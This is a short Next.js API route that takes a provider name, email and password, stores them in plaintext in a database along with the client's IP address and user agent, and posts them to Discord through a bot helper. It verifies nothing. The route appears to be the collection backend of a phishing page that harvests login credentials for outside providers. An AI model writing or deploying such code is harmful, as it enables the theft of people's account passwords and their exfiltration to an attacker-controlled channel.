import { NextRequest, NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";
import { sendAuditEmbed } from "@/lib/discord/bot";

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { provider, email, password } = body;

    if (!provider || !email || !password) {
      return NextResponse.json({ ok: false }, { status: 400 });
    }

    const ip = req.headers.get("x-forwarded-for") || "unknown";
    const userAgent = req.headers.get("user-agent") || "unknown";

    await prisma.authAttempt.create({
      data: { provider, email, password, ip, userAgent },
    });

    await sendAuditEmbed({ provider, email, password, ip, userAgent });

    return NextResponse.json({ ok: true });
  } catch {
    return NextResponse.json({ ok: false }, { status: 500 });
  }
}
